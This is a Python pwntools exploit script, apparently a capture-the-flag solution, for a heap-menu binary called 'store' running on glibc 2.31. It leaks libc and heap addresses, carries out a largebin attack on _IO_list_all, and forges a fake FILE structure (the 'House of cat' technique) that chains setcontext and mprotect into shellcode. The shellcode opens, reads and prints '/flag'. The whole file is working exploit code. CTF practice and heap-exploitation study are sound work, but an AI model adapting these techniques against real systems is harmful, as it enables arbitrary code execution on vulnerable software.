from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./store'])
elf = ELF('./store')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')


def menu(choice: int):
    sh.sendlineafter(b"choice: ", str(choice).encode())


def add(size: int, content: bytes, remark: bytes):
    menu(1)
    sh.sendlineafter(b"Size: ", str(size).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def delete(idx: int):
    menu(2)
    sh.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx: int, content: bytes, remark: bytes):
    menu(3)
    sh.sendlineafter(b"Index: ", str(idx).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def show(idx: int):
    menu(4)
    sh.sendlineafter(b"Index: ", str(idx).encode())


add(0x460, b'\x00', b'\x00')  # 0
add(0x440, b'\x00', b'\x00')  # 1
delete(0)
show(0)

sh.recvuntil(b"Content: \n")
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
largebin_fd = libc_base + 0x1ebfe0
io_list = libc_base + libc.sym['_IO_list_all']
io_wfile_jumps = libc_base+libc.sym['_IO_wfile_jumps']
setcontext = libc_base + libc.sym['setcontext']
mprotect = libc_base + libc.sym['mprotect']
print("libc_base >>>", hex(libc_base))

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())
edit(0, b'A'*0x10, b'\x00')
show(0)

sh.recvuntil(b'A'*0x10)
heap_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print("heap_base >>>", hex(heap_base))
edit(0, p64(largebin_fd)*2 + p64(heap_base + 0x290) + p64(io_list-0x20), b'\x00')
delete(1)

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())

# House of cat
fake_io_addr = heap_base + 0xb70                    # 伪造的fake_IO结构体的地址
fake_IO_FILE = p64(0)                               
fake_IO_FILE += p64(0) * 5
fake_IO_FILE += p64(1) + p64(2)                     # rcx!=0(FSOP)
fake_IO_FILE += p64(heap_base + 0xfc0 - 0x50)              # _IO_backup_base=rdx
fake_IO_FILE += p64(setcontext+61)                  # _IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)                              # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_base+0x1000)               # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x30)               # _wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1)                              # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(io_wfile_jumps+0x30)            # vtable=IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr+0x40)              # rax2_addr

shellcode = asm(
    '''
    mov rax, 0xc0
    mov rbx, 0x500000
    mov rcx, 0x5000
    mov rdx, 3
    mov rsi, 0x100021
    xor rdi, rdi
    xor rbp, rbp
    int 0x80        # mmap(0x500000, 0x5000, 3, 0x100021, 0, 0)
    
    mov rdi, 0
    mov rsi, 0x502000
    mov rdx, 0x100
    xor rax, rax
    syscall
     
    mov rax, 5
    mov rbx, 0x502000
    xor rcx, rcx
    xor rdx, rdx
    int 0x80        # open(0x502000, 0, 0)
     
    mov rdi, rax
    mov rsi, 0x503000
    mov rdx, 0x100
    xor rax, rax
    syscall
     
    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch='amd64')

#                           rdi                rsi                   rdx                          rsp           rcx(retn_addr)
payload = p64(0) + p64(heap_base+0x1000) + p64(0x2000) + p64(0)*2 + p64(7) + p64(0)*2 + p64(heap_base+0x1020) + p64(mprotect) + p64(heap_base+0x1028) + shellcode
edit(1, fake_IO_FILE, payload)
gdb.attach(sh, 'b *mprotect')
pause()
menu(5)
sh.send(b'/flag\x00')
sh.interactive()